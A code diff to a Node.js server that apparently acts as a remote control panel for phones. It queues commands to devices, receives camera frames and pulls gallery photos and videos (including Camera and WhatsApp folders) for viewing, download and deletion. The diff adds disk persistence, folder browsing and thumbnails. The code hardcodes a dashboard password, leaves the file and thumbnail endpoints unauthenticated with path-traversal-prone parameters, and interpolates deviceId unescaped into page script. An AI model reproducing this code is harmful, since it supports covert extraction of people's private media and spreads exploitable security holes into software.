@@ -5,6 +5,7 @@ const cors = require('cors');
 const crypto = require('crypto');
 const fs = require('fs');
 const path = require('path');
+const sharp = require('sharp');
 
 const app = express();
 const server = http.createServer(app);
@@ -23,7 +24,44 @@ if (!fs.existsSync(GALLERY_DIR)) {
     fs.mkdirSync(GALLERY_DIR, { recursive: true });
 }
 
-let galleryData = {};
+let galleryData = loadGalleryData();
+
+// ========== DEVICE PERSISTENCE ==========
+const DEVICES_FILE = path.join(GALLERY_DIR, '_devices.json');
+
+function saveDevices() {
+    try {
+        fs.writeFileSync(DEVICES_FILE, JSON.stringify(devices, null, 2));
+    } catch (e) {}
+}
+
+function loadDevices() {
+    try {
+        if (fs.existsSync(DEVICES_FILE)) {
+            const saved = JSON.parse(fs.readFileSync(DEVICES_FILE, 'utf8'));
+            const cutoff = Date.now() - 5 * 60 * 1000;
+            return saved.filter(d => (d.lastSeen || 0) > cutoff);
+        }
+    } catch (e) {}
+    return [];
+}
+
+const GALLERY_DATA_FILE = path.join(GALLERY_DIR, '_gallerydata.json');
+
+function saveGalleryData() {
+    try {
+        fs.writeFileSync(GALLERY_DATA_FILE, JSON.stringify(galleryData, null, 2));
+    } catch (e) {}
+}
+
+function loadGalleryData() {
+    try {
+        if (fs.existsSync(GALLERY_DATA_FILE)) {
+            return JSON.parse(fs.readFileSync(GALLERY_DATA_FILE, 'utf8'));
+        }
+    } catch (e) {}
+    return {};
+}
 
 // ========== AUTH ==========
 const DASHBOARD_PASSWORD = 'ajaybabu95';
@@ -43,7 +81,7 @@ function requireAuth(req, res, next) {
 }
 
 // ========== STATE ==========
-let devices = [];
+let devices = loadDevices();
 let deviceHeartbeats = {};
 let pendingCommands = {};
 let latestFrames = {};
@@ -94,7 +132,7 @@ setInterval(() => {
         const lastSeen = device.lastSeen || 0;
         const hasRecentFrames = frameQueues[device.id] && frameQueues[device.id].length > 0 &&
             latestFrames[device.id] && (now - (latestFrames[device.id].ts || 0)) < 30000;
-        const stale = (now - lastSeen) > 60000 && !hasRecentFrames;
+        const stale = (now - lastSeen) > 30000 && !hasRecentFrames;
         if (stale) {
             console.log(`🧹 Removing stale device: ${device.id}`);
             delete deviceHeartbeats[device.id];
@@ -162,6 +200,7 @@ app.post('/api/heartbeat', (req, res) => {
         device.batteryPercentage = batteryPercentage || 0;
         device.lastHeartbeat = new Date().toLocaleTimeString();
         device.lastSeen = Date.now();
+        saveDevices();
         res.json({ success: true, settings: getDeviceSettings(deviceId) });
     } catch (e) {
         res.status(500).json({ success: false, error: e.message });
@@ -193,6 +232,7 @@ app.post('/api/sync/gallery', (req, res) => {
             fs.mkdirSync(deviceDir, { recursive: true });
         }
 
+        saveGalleryData();
         console.log(`✅ Gallery metadata saved: ${files.length} files for ${deviceId}`);
         res.json({ success: true, count: files.length });
     } catch (e) {
@@ -237,16 +277,42 @@ app.get('/api/gallery/:deviceId', (req, res) => {
 app.get('/api/gallery/file/:deviceId/:fileName', (req, res) => {
     try {
         const { deviceId, fileName } = req.params;
+        const folder = req.query.folder || null;
         
         const deviceDir = path.join(GALLERY_DIR, deviceId);
-        const filePath = path.join(deviceDir, fileName);
-        
-        if (fs.existsSync(filePath)) {
+        const ext = path.extname(fileName).toLowerCase();
+        const isImage = ['.jpg','.jpeg','.png','.gif','.webp'].includes(ext);
+        const type = isImage ? 'image' : 'video';
+
+        let filePath = null;
+        if (folder) {
+            const folderPath = path.join(deviceDir, folder, fileName);
+            if (fs.existsSync(folderPath)) filePath = folderPath;
+        }
+        if (!filePath) {
+            const directPath = path.join(deviceDir, fileName);
+            if (fs.existsSync(directPath)) filePath = directPath;
+        }
+        if (!filePath && folder) {
+            const nested = path.join(deviceDir, folder);
+            if (fs.existsSync(nested)) {
+                const sub = path.join(nested, fileName);
+                if (fs.existsSync(sub)) filePath = sub;
+            }
+        }
+        if (!filePath) {
+            if (fs.existsSync(deviceDir)) {
+                const subdirs = fs.readdirSync(deviceDir);
+                for (const sub of subdirs) {
+                    const candidate = path.join(deviceDir, sub, fileName);
+                    if (fs.existsSync(candidate)) { filePath = candidate; break; }
+                }
+            }
+        }
+
+        if (filePath) {
             const data = fs.readFileSync(filePath);
             const base64 = data.toString('base64');
-            const ext = path.extname(fileName).toLowerCase();
-            const type = ['.jpg','.jpeg','.png','.gif','.webp'].includes(ext) ? 'image' : 'video';
-            
             return res.json({
                 success: true,
                 name: fileName,
@@ -256,10 +322,13 @@ app.get('/api/gallery/file/:deviceId/:fileName', (req, res) => {
             });
         }
 
-        console.log(`📤 Requesting file from device: ${fileName}`);
-        const cmd = { command: 'gallery_file', value: fileName };
-        if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
-        pendingCommands[deviceId].push(cmd);
+        const alreadyPending = (pendingCommands[deviceId] || []).some(c => c.command === 'gallery_file' && c.value === fileName);
+        if (!alreadyPending) {
+            console.log(`📤 Requesting file from device: ${fileName}`);
+            const cmd = { command: 'gallery_file', value: fileName };
+            if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
+            pendingCommands[deviceId].push(cmd);
+        }
 
         res.json({
             success: false,
@@ -307,6 +376,7 @@ app.post('/api/upload/file', (req, res) => {
             });
         }
 
+        saveGalleryData();
         res.json({
             success: true,
             message: `File saved: ${file.name}`,
@@ -636,7 +706,7 @@ app.get('/api/devices', (req, res) => {
             cameraPermission: d.cameraPermission || false,
             batteryOptimization: d.batteryOptimization || false,
             batteryPercentage: d.batteryPercentage || 0,
-            isConnected: (now - (d.lastSeen || 0)) < 60000,
+            isConnected: (now - (d.lastSeen || 0)) < 30000,
             hasWebSocket: !!activeStreams[d.id],
             lastHeartbeat: d.lastHeartbeat,
             connectedAt: d.connectedAt,
@@ -654,7 +724,7 @@ app.get('/api/device/:deviceId', (req, res) => {
         success: true,
         device: {
             ...device,
-            isConnected: (now - (device.lastSeen || 0)) < 60000,
+            isConnected: (now - (device.lastSeen || 0)) < 30000,
             hasWebSocket: !!activeStreams[device.id],
             galleryCount: (galleryData[device.id] || []).length,
             settings: getDeviceSettings(device.id)
@@ -703,6 +773,50 @@ app.get('/api/settings', (req, res) => res.json({ success: true, settings: { str
 
 app.get('/favicon.ico', (req, res) => res.status(204).end());
 
+// ========== THUMBNAIL API ==========
+app.get('/api/gallery/thumb/:deviceId/:fileName', async (req, res) => {
+    try {
+        const { deviceId, fileName } = req.params;
+        const folder = req.query.folder || null;
+        const deviceDir = path.join(GALLERY_DIR, deviceId);
+        const ext = path.extname(fileName).toLowerCase();
+        const isVideo = ['mp4','3gp','mkv','avi','mov','webm'].includes(ext.replace('.',''));
+
+        let filePath = null;
+        const search = (base) => {
+            if (folder) {
+                const fp = path.join(base, folder, fileName);
+                if (fs.existsSync(fp)) return fp;
+            }
+            const dp = path.join(base, fileName);
+            if (fs.existsSync(dp)) return dp;
+            if (fs.existsSync(base)) {
+                for (const sub of fs.readdirSync(base)) {
+                    const cp = path.join(base, sub, fileName);
+                    if (fs.existsSync(cp)) return cp;
+                }
+            }
+            return null;
+        };
+        filePath = search(deviceDir);
+
+        if (!filePath || isVideo) {
+            return res.status(404).end();
+        }
+
+        const thumbBuffer = await sharp(filePath)
+            .resize(120, 120, { fit: 'cover' })
+            .jpeg({ quality: 20 })
+            .toBuffer();
+
+        res.set('Content-Type', 'image/jpeg');
+        res.set('Cache-Control', 'public, max-age=86400');
+        res.send(thumbBuffer);
+    } catch (e) {
+        res.status(404).end();
+    }
+});
+
 // ========== GALLERY PAGE ==========
 app.get('/gallery/:deviceId', requireAuth, (req, res) => {
     const { deviceId } = req.params;
@@ -716,11 +830,11 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#0a0a0a; min-height:100vh; padding:20px; color:#fff; }
-        .container { max-width:900px; margin:0 auto; }
+        .container { max-width:960px; margin:0 auto; }
         .header { display:flex; justify-content:space-between; align-items:center; padding:15px 0; border-bottom:1px solid #2a2a2a; margin-bottom:20px; flex-wrap:wrap; gap:10px; }
         .header h1 { font-size:20px; }
         .header h1 span { color:#667eea; }
-        .back-btn { background:none; border:1px solid #444; color:#aaa; padding:8px 16px; border-radius:8px; cursor:pointer; font-size:13px; text-decoration:none; transition:all .2s; }
+        .back-btn { background:none; border:1px solid #444; color:#aaa; padding:8px 16px; border-radius:8px; cursor:pointer; font-size:13px; text-decoration:none; transition:all .2s; display:inline-block; }
         .back-btn:hover { border-color:#667eea; color:#fff; }
         .stats { display:flex; gap:20px; flex-wrap:wrap; margin-bottom:20px; padding:15px; background:#1a1a1a; border-radius:12px; border:1px solid #2a2a2a; }
         .stat-item { font-size:13px; color:#888; }
@@ -728,32 +842,45 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         .sync-btn { background:#4CAF50; border:none; color:white; padding:8px 20px; border-radius:8px; cursor:pointer; font-size:13px; transition:all .2s; }
         .sync-btn:hover { opacity:.8; }
         .sync-btn:disabled { opacity:.5; cursor:not-allowed; }
-        .folder-section { margin-bottom:25px; }
-        .folder-title { font-size:16px; font-weight:600; color:#667eea; margin-bottom:10px; padding:8px 12px; background:#1a1a1a; border-radius:8px; border-left:3px solid #667eea; }
+        .breadcrumb { display:flex; align-items:center; gap:8px; margin-bottom:18px; font-size:14px; color:#888; }
+        .breadcrumb .crumb { cursor:pointer; color:#667eea; }
+        .breadcrumb .crumb:hover { text-decoration:underline; }
+        .breadcrumb .sep { color:#444; }
+        .breadcrumb .current { color:#fff; }
+        /* Folder grid */
+        .folder-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(160px,1fr)); gap:14px; }
+        .folder-card { background:#1a1a1a; border-radius:14px; border:1px solid #2a2a2a; padding:20px 16px; cursor:pointer; transition:all .2s; text-align:center; }
+        .folder-card:hover { border-color:#667eea; transform:translateY(-2px); background:#222; }
+        .folder-card .f-icon { font-size:42px; margin-bottom:10px; }
+        .folder-card .f-name { font-size:13px; font-weight:600; color:#ddd; word-break:break-word; margin-bottom:4px; }
+        .folder-card .f-count { font-size:11px; color:#666; }
+        /* File grid */
         .gallery-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(150px,1fr)); gap:12px; }
         .gallery-item { background:#1a1a1a; border-radius:12px; overflow:hidden; border:1px solid #2a2a2a; cursor:pointer; transition:all .2s; }
         .gallery-item:hover { transform:scale(1.03); border-color:#667eea; }
-        .gallery-item .thumb { width:100%; height:150px; display:flex; align-items:center; justify-content:center; font-size:48px; color:#555; background:#111; }
+        .gallery-item .thumb { width:100%; height:150px; display:flex; align-items:center; justify-content:center; font-size:48px; color:#555; background:#111; position:relative; }
+        .gallery-item.video .thumb .play-badge { position:absolute; font-size:28px; }
         .gallery-item .info { padding:8px 10px; }
         .gallery-item .info .name { font-size:11px; color:#ccc; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
         .gallery-item .info .size { font-size:10px; color:#666; }
-        .gallery-item.video .thumb::after { content:'▶'; position:absolute; font-size:40px; color:rgba(255,255,255,.8); text-shadow:0 0 20px rgba(0,0,0,.8); }
-        .gallery-item.video .thumb { position:relative; }
-        .loading { text-align:center; color:#666; padding:40px; }
-        .empty { text-align:center; color:#666; padding:40px; }
-        .empty span { font-size:48px; display:block; margin-bottom:10px; }
-        .viewer { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.95); z-index:9999; align-items:center; justify-content:center; flex-direction:column; }
+        .loading { text-align:center; color:#666; padding:60px; font-size:15px; }
+        .empty { text-align:center; color:#666; padding:60px; }
+        .empty .e-icon { font-size:52px; display:block; margin-bottom:12px; }
+        /* Viewer overlay */
+        .viewer { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.96); z-index:9999; flex-direction:column; align-items:center; justify-content:center; }
         .viewer.active { display:flex; }
-        .viewer img { max-width:95%; max-height:80vh; object-fit:contain; border-radius:8px; }
-        .viewer .controls { display:flex; gap:15px; margin-top:20px; flex-wrap:wrap; justify-content:center; }
-        .viewer .controls button { background:rgba(255,255,255,.1); border:1px solid #444; color:#fff; padding:10px 20px; border-radius:10px; cursor:pointer; font-size:14px; transition:all .2s; }
-        .viewer .controls button:hover { background:#667eea; border-color:#667eea; }
-        .viewer .controls button.danger:hover { background:#f44336; border-color:#f44336; }
-        .viewer .close { position:absolute; top:20px; right:30px; background:none; border:none; color:#fff; font-size:36px; cursor:pointer; }
-        .viewer .close:hover { color:#f44336; }
-        .viewer .info { color:#888; font-size:13px; margin-top:10px; text-align:center; }
-        .viewer .folder-name { color:#667eea; font-size:12px; }
-        @media (max-width:500px){ .gallery-grid { grid-template-columns:repeat(auto-fill, minmax(120px,1fr)); } }
+        .viewer .v-close { position:absolute; top:16px; right:24px; background:rgba(0,0,0,.6); border:2px solid rgba(255,255,255,.3); color:#fff; font-size:28px; cursor:pointer; line-height:1; z-index:99999; width:44px; height:44px; border-radius:50%; display:flex; align-items:center; justify-content:center; }
+        .viewer .v-close:hover { color:#f44336; }
+        .viewer .v-media { max-width:95vw; max-height:78vh; object-fit:contain; border-radius:8px; display:block; }
+        .viewer video.v-media { background:#000; }
+        .viewer .v-info { color:#888; font-size:13px; margin-top:12px; text-align:center; }
+        .viewer .v-info .folder-tag { color:#667eea; }
+        .viewer .v-controls { display:flex; gap:12px; margin-top:14px; flex-wrap:wrap; justify-content:center; align-items:center; }
+        .viewer .v-controls button { background:rgba(255,255,255,.1); border:1px solid #444; color:#fff; padding:9px 18px; border-radius:10px; cursor:pointer; font-size:13px; transition:all .2s; }
+        .viewer .v-controls button:hover { background:#667eea; border-color:#667eea; }
+        .viewer .v-controls button.danger:hover { background:#f44336; border-color:#f44336; }
+        .viewer .v-counter { color:#888; font-size:13px; }
+        @media (max-width:500px){ .gallery-grid { grid-template-columns:repeat(auto-fill, minmax(120px,1fr)); } .folder-grid { grid-template-columns:repeat(auto-fill, minmax(130px,1fr)); } }
     </style>
 </head>
 <body>
@@ -771,86 +898,219 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         <div class="stat-item">📁 Folders: <strong id="folderCount">0</strong></div>
         <div class="stat-item">📄 Total: <strong id="totalCount">0</strong></div>
     </div>
+    <div class="breadcrumb" id="breadcrumb"></div>
     <div id="galleryContent"><div class="loading">⏳ Loading gallery...</div></div>
 </div>
 
+<!-- Full-screen viewer -->
 <div class="viewer" id="viewer">
-    <button class="close" onclick="closeViewer()">✕</button>
-    <img id="viewerImage" src="" alt="Image">
-    <div class="info" id="viewerInfo"></div>
-    <div class="controls">
-        <button onclick="prevImage()">◀ Prev</button>
-        <span id="viewerCounter" style="color:#888;font-size:13px;">1/1</span>
-        <button onclick="nextImage()">Next ▶</button>
-        <button onclick="downloadImage()">⬇ Download</button>
-        <button class="danger" onclick="deleteImage()">🗑 Delete</button>
+    <button class="v-close" onclick="closeViewer()">✕</button>
+    <div id="viewerLoading" style="display:none;text-align:center;color:#aaa;">
+        <div style="font-size:48px;margin-bottom:12px;">⏳</div>
+        <div style="font-size:16px;font-weight:600;">Loading...</div>
+        <div style="font-size:12px;color:#666;margin-top:6px;" id="viewerLoadingNote"></div>
+    </div>
+    <img id="viewerImg" class="v-media" src="" alt="" style="display:none;">
+    <video id="viewerVid" class="v-media" controls style="display:none;"></video>
+    <div class="v-info" id="viewerInfo"></div>
+    <div class="v-controls">
+        <button onclick="prevFile()">◀ Prev</button>
+        <span class="v-counter" id="viewerCounter">1/1</span>
+        <button onclick="nextFile()">Next ▶</button>
+        <button onclick="downloadFile()">⬇ Download</button>
+        <button class="danger" onclick="deleteFile()">🗑 Delete</button>
     </div>
 </div>
 
 <script>
     const deviceId = '${deviceId}';
-    let allFiles = [];
+    let allFolders = {};      // { folderName: [files] }
+    let currentFolderName = null;
+    let currentFolderFiles = [];
     let currentIndex = 0;
+    let viewerDataUrl = '';
 
+    // ── Helpers ──────────────────────────────────────
+    function getMime(fileName, type) {
+        const ext = fileName.split('.').pop().toLowerCase();
+        if (type === 'video' || ['mp4','3gp','mkv','avi','mov','webm'].includes(ext)) {
+            const map = { mp4:'video/mp4', '3gp':'video/3gpp', mkv:'video/x-matroska', webm:'video/webm', mov:'video/quicktime', avi:'video/x-msvideo' };
+            return map[ext] || 'video/mp4';
+        }
+        const map = { jpg:'image/jpeg', jpeg:'image/jpeg', png:'image/png', gif:'image/gif', webp:'image/webp', bmp:'image/bmp' };
+        return map[ext] || 'image/jpeg';
+    }
+
+    function formatSize(bytes) {
+        if (!bytes) return '?';
+        if (bytes < 1024) return bytes + 'B';
+        if (bytes < 1024*1024) return (bytes/1024).toFixed(0) + 'KB';
+        return (bytes/(1024*1024)).toFixed(1) + 'MB';
+    }
+
+    function getFolderIcon(name) {
+        const n = name.toLowerCase();
+        if (n.includes('camera') || n.includes('dcim')) return '📷';
+        if (n.includes('screenshot')) return '🖼️';
+        if (n.includes('whatsapp') || n.includes('wa')) return '💬';
+        if (n.includes('download')) return '⬇️';
+        if (n.includes('video')) return '🎬';
+        if (n.includes('picture') || n.includes('photo')) return '🌅';
+        return '📁';
+    }
+
+    // ── Load data ────────────────────────────────────
     function loadGallery() {
         document.getElementById('galleryContent').innerHTML = '<div class="loading">⏳ Loading gallery...</div>';
-        
-        fetch('/api/gallery/' + deviceId)
-            .then(r => r.json())
+        fetch('/api/gallery/' + encodeURIComponent(deviceId))
+            .then(r => {
+                if (!r.ok) throw new Error('HTTP ' + r.status);
+                return r.json();
+            })
             .then(data => {
                 if (data.success) {
-                    allFiles = data.files || [];
+                    allFolders = data.folders || {};
                     document.getElementById('imgCount').textContent = data.images || 0;
                     document.getElementById('vidCount').textContent = data.videos || 0;
                     document.getElementById('folderCount').textContent = data.folderCount || 0;
                     document.getElementById('totalCount').textContent = data.count || 0;
-                    renderGallery(data.folders);
+                    showFolderList();
                 } else {
-                    document.getElementById('galleryContent').innerHTML = '<div class="empty"><span>📭</span>No files found</div>';
+                    document.getElementById('galleryContent').innerHTML = '<div class="empty"><span class="e-icon">📭</span>No files found.<br><small style="color:#555">Device se Sync karo</small></div>';
+                    setBreadcrumb(null);
                 }
             })
-            .catch(() => {
-                document.getElementById('galleryContent').innerHTML = '<div class="empty"><span>❌</span>Error loading gallery</div>';
+            .catch(err => {
+                document.getElementById('galleryContent').innerHTML = '<div class="empty"><span class="e-icon">❌</span>Error: ' + (err.message || 'Network error') + '<br><button onclick="loadGallery()" style="margin-top:12px;padding:8px 18px;border-radius:8px;border:1px solid #667eea;background:none;color:#667eea;cursor:pointer;">Retry</button></div>';
             });
     }
 
-    function renderGallery(folders) {
-        if (!folders || Object.keys(folders).length === 0) {
-            document.getElementById('galleryContent').innerHTML = '<div class="empty"><span>📭</span>No files found</div>';
+    // ── View 1: Folder list ──────────────────────────
+    let folderNames = [];   // index → folder name, used by onclick
+
+    function showFolderList() {
+        currentFolderName = null;
+        currentFolderFiles = [];
+        setBreadcrumb(null);
+
+        folderNames = Object.keys(allFolders).sort();
+        if (folderNames.length === 0) {
+            document.getElementById('galleryContent').innerHTML = '<div class="empty"><span class="e-icon">📭</span>No folders found. Sync from device first.</div>';
             return;
         }
 
-        let html = '';
-        Object.keys(folders).sort().forEach(folderName => {
-            const files = folders[folderName];
-            html += '<div class="folder-section">';
-            html += '<div class="folder-title">📁 ' + folderName + ' (' + files.length + ')</div>';
-            html += '<div class="gallery-grid">';
-            files.forEach((file, idx) => {
-                const globalIndex = allFiles.indexOf(file);
-                const isVideo = file.type === 'video';
-                const sizeMB = (file.size / (1024 * 1024)).toFixed(1);
-                html += '<div class="gallery-item ' + (isVideo ? 'video' : '') + '" onclick="openViewer(' + globalIndex + ')">';
-                html += '<div class="thumb">' + (isVideo ? '🎬' : '📷') + '</div>';
-                html += '<div class="info"><div class="name">' + file.name + '</div><div class="size">' + sizeMB + 'MB</div></div>';
-                html += '</div>';
-            });
-            html += '</div></div>';
+        let html = '<div class="folder-grid">';
+        folderNames.forEach((name, idx) => {
+            const files = allFolders[name] || [];
+            const imgCount = files.filter(f => f.type === 'image').length;
+            const vidCount = files.filter(f => f.type === 'video').length;
+            const icon = getFolderIcon(name);
+            const detail = [];
+            if (imgCount) detail.push(imgCount + ' 📷');
+            if (vidCount) detail.push(vidCount + ' 🎬');
+            html += '<div class="folder-card" onclick="openFolderByIndex(' + idx + ')">';
+            html += '<div class="f-icon">' + icon + '</div>';
+            html += '<div class="f-name">' + name + '</div>';
+            html += '<div class="f-count">' + files.length + ' files' + (detail.length ? ' • ' + detail.join(' ') : '') + '</div>';
+            html += '</div>';
         });
+        html += '</div>';
         document.getElementById('galleryContent').innerHTML = html;
     }
 
+    function openFolderByIndex(idx) {
+        openFolder(folderNames[idx]);
+    }
+
+    // ── View 2: Files inside a folder ────────────────
+    function openFolder(folderName) {
+        currentFolderName = folderName;
+        currentFolderFiles = allFolders[folderName] || [];
+        setBreadcrumb(folderName);
+
+        if (currentFolderFiles.length === 0) {
+            document.getElementById('galleryContent').innerHTML = '<div class="empty"><span class="e-icon">📭</span>Folder is empty</div>';
+            return;
+        }
+
+        const FALLBACK_IMG = 'data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22150%22 height=%22150%22%3E%3Crect fill=%22%231a1a1a%22 width=%22150%22 height=%22150%22/%3E%3Ctext x=%2250%25%22 y=%2250%25%22 text-anchor=%22middle%22 dy=%22.3em%22 fill=%22%23555%22 font-size=%2240%22%3E%F0%9F%93%B7%3C/text%3E%3C/svg%3E';
+        const FALLBACK_VID = 'data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22150%22 height=%22150%22%3E%3Crect fill=%22%23111%22 width=%22150%22 height=%22150%22/%3E%3Ctext x=%2250%25%22 y=%2245%25%22 text-anchor=%22middle%22 dy=%22.3em%22 fill=%22%23555%22 font-size=%2244%22%3E%F0%9F%8E%AC%3C/text%3E%3Ctext x=%2250%25%22 y=%2275%25%22 text-anchor=%22middle%22 dy=%22.3em%22 fill=%22%23444%22 font-size=%2222%22%3E%E2%96%B6%3C/text%3E%3C/svg%3E';
+
+        let html = '<div class="gallery-grid">';
+        currentFolderFiles.forEach((file, idx) => {
+            const isVideo = file.type === 'video';
+            const folderParam = encodeURIComponent(file.folder || currentFolderName || '');
+            const thumbUrl = '/api/gallery/thumb/' + encodeURIComponent(deviceId) + '/' + encodeURIComponent(file.name) + '?folder=' + folderParam;
+            const safeIdx = Number(idx);
+            html += '<div class="gallery-item ' + (isVideo ? 'video' : '') + '" onclick="openViewer(' + safeIdx + ')">';
+            html += '<div class="thumb" style="padding:0;overflow:hidden;position:relative;">';
+            if (isVideo) {
+                html += '<img src="' + FALLBACK_VID + '" style="width:100%;height:150px;object-fit:cover;display:block;">';
+                html += '<span class="play-badge" style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:30px;pointer-events:none;">▶</span>';
+            } else {
+                html += '<img data-src="' + thumbUrl + '" src="' + FALLBACK_IMG + '" style="width:100%;height:150px;object-fit:cover;display:block;" class="lazy-thumb">';
+            }
+            html += '</div>';
+            html += '<div class="info">';
+            html += '<div class="name" title="' + file.name.replace(/"/g,'') + '">' + file.name.substring(0, 20) + (file.name.length > 20 ? '…' : '') + '</div>';
+            html += '<div class="size">' + formatSize(file.size) + '</div>';
+            html += '</div></div>';
+        });
+        html += '</div>';
+        document.getElementById('galleryContent').innerHTML = html;
+
+        // IntersectionObserver lazy loading — sirf visible thumbs load honge
+        const lazyImgs = document.querySelectorAll('.lazy-thumb');
+        if ('IntersectionObserver' in window) {
+            const obs = new IntersectionObserver((entries, observer) => {
+                entries.forEach(entry => {
+                    if (!entry.isIntersecting) return;
+                    const img = entry.target;
+                    const src = img.getAttribute('data-src');
+                    if (src) {
+                        img.onerror = () => { img.onerror = null; img.src = FALLBACK_IMG; };
+                        img.src = src;
+                        img.removeAttribute('data-src');
+                    }
+                    observer.unobserve(img);
+                });
+            }, { rootMargin: '150px' });
+            lazyImgs.forEach(img => obs.observe(img));
+        } else {
+            // fallback for old browsers
+            lazyImgs.forEach(img => {
+                const src = img.getAttribute('data-src');
+                if (src) {
+                    img.onerror = () => { img.onerror = null; img.src = FALLBACK_IMG; };
+                    img.src = src;
+                    img.removeAttribute('data-src');
+                }
+            });
+        }
+    }
+
+    // ── Breadcrumb ───────────────────────────────────
+    function setBreadcrumb(folderName) {
+        const bc = document.getElementById('breadcrumb');
+        if (!folderName) {
+            bc.innerHTML = '<span class="current">📸 All Folders</span>';
+        } else {
+            bc.innerHTML = '<span class="crumb" onclick="showFolderList()">📸 All Folders</span>' +
+                           '<span class="sep">›</span>' +
+                           '<span class="current">' + folderName + '</span>';
+        }
+    }
+
+    // ── Sync ─────────────────────────────────────────
     function syncGallery() {
         const btn = document.getElementById('syncBtn');
         btn.disabled = true;
         btn.textContent = '⏳ Syncing...';
-        
         fetch('/api/command', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ deviceId: deviceId, command: 'sync_gallery' })
         }).catch(() => {});
-        
         setTimeout(() => {
             loadGallery();
             btn.disabled = false;
@@ -858,52 +1118,99 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
         }, 3000);
     }
 
+    // ── Viewer ───────────────────────────────────────
+    function showViewerLoading(note) {
+        document.getElementById('viewerLoading').style.display = 'block';
+        document.getElementById('viewerLoadingNote').textContent = note || '';
+        document.getElementById('viewerImg').style.display = 'none';
+        document.getElementById('viewerVid').style.display = 'none';
+    }
+
+    function hideViewerLoading() {
+        document.getElementById('viewerLoading').style.display = 'none';
+    }
+
     function openViewer(index) {
-        if (index < 0 || index >= allFiles.length) return;
+        if (index < 0 || index >= currentFolderFiles.length) return;
         currentIndex = index;
-        const file = allFiles[index];
-        document.getElementById('viewerInfo').innerHTML = 
-            '<span class="folder-name">📁 ' + (file.folder || 'Root') + '</span> • ' + 
-            file.name + ' • ' + (file.size / (1024 * 1024)).toFixed(1) + 'MB';
-        document.getElementById('viewerCounter').textContent = (index + 1) + '/' + allFiles.length;
-        document.getElementById('viewerImage').src = '';
-        document.getElementById('viewerImage').alt = 'Loading...';
+        const file = currentFolderFiles[index];
+        const isVideo = file.type === 'video';
+
+        const imgEl = document.getElementById('viewerImg');
+        const vidEl = document.getElementById('viewerVid');
+
+        vidEl.pause();
+        vidEl.removeAttribute('src');
+        imgEl.src = '';
+        viewerDataUrl = '';
+
+        document.getElementById('viewerInfo').innerHTML =
+            '<span class="folder-tag">📁 ' + (file.folder || currentFolderName || 'Root') + '</span> • ' +
+            file.name + ' • ' + formatSize(file.size);
+        document.getElementById('viewerCounter').textContent = (index + 1) + '/' + currentFolderFiles.length;
         document.getElementById('viewer').classList.add('active');
-        
-        fetch('/api/gallery/file/' + deviceId + '/' + encodeURIComponent(file.name))
+
+        showViewerLoading('');
+
+        const url = '/api/gallery/file/' + deviceId + '/' + encodeURIComponent(file.name) +
+                    '?folder=' + encodeURIComponent(file.folder || currentFolderName || '');
+
+        fetch(url)
             .then(r => r.json())
             .then(data => {
                 if (data.success && data.data) {
-                    document.getElementById('viewerImage').src = 'data:image/jpeg;base64,' + data.data;
+                    const mime = getMime(file.name, data.type || file.type);
+                    const dataUrl = 'data:' + mime + ';base64,' + data.data;
+                    viewerDataUrl = dataUrl;
+                    hideViewerLoading();
+                    if (isVideo) {
+                        vidEl.src = dataUrl;
+                        vidEl.style.display = 'block';
+                        vidEl.play().catch(() => {});
+                    } else {
+                        imgEl.src = dataUrl;
+                        imgEl.style.display = 'block';
+                    }
                 } else if (data.pending) {
-                    document.getElementById('viewerImage').alt = '⏳ Requesting from device...';
-                    setTimeout(() => openViewer(index), 3000);
+                    showViewerLoading('File device se download ho rahi hai...');
+                    setTimeout(() => {
+                        if (document.getElementById('viewer').classList.contains('active') && currentIndex === index) {
+                            openViewer(index);
+                        }
+                    }, 3000);
                 } else {
-                    document.getElementById('viewerImage').alt = '❌ Failed to load';
+                    hideViewerLoading();
+                    imgEl.alt = '❌ File not found';
+                    imgEl.style.display = 'block';
                 }
             })
-            .catch(() => { document.getElementById('viewerImage').alt = '❌ Error'; });
+            .catch(() => {
+                showViewerLoading('❌ Network error');
+            });
     }
 
-    function closeViewer() { document.getElementById('viewer').classList.remove('active'); }
-    function prevImage() { if (currentIndex > 0) openViewer(currentIndex - 1); }
-    function nextImage() { if (currentIndex < allFiles.length - 1) openViewer(currentIndex + 1); }
-
-    function downloadImage() {
-        const img = document.getElementById('viewerImage');
-        if (img.src && img.src.startsWith('data:')) {
-            const link = document.createElement('a');
-            link.href = img.src;
-            link.download = allFiles[currentIndex]?.name || 'image';
-            link.click();
-        }
+    function closeViewer() {
+        const vidEl = document.getElementById('viewerVid');
+        vidEl.pause();
+        vidEl.removeAttribute('src');
+        document.getElementById('viewer').classList.remove('active');
     }
 
-    function deleteImage() {
+    function prevFile() { if (currentIndex > 0) openViewer(currentIndex - 1); }
+    function nextFile() { if (currentIndex < currentFolderFiles.length - 1) openViewer(currentIndex + 1); }
+
+    function downloadFile() {
+        if (!viewerDataUrl) return;
+        const link = document.createElement('a');
+        link.href = viewerDataUrl;
+        link.download = currentFolderFiles[currentIndex]?.name || 'file';
+        link.click();
+    }
+
+    function deleteFile() {
         if (!confirm('Delete this file?')) return;
-        const file = allFiles[currentIndex];
+        const file = currentFolderFiles[currentIndex];
         if (!file) return;
-        
         fetch('/api/gallery/file/' + deviceId + '/' + encodeURIComponent(file.name), { method: 'DELETE' })
             .then(r => r.json())
             .then(data => {
@@ -917,9 +1224,10 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
     }
 
     document.addEventListener('keydown', (e) => {
+        if (!document.getElementById('viewer').classList.contains('active')) return;
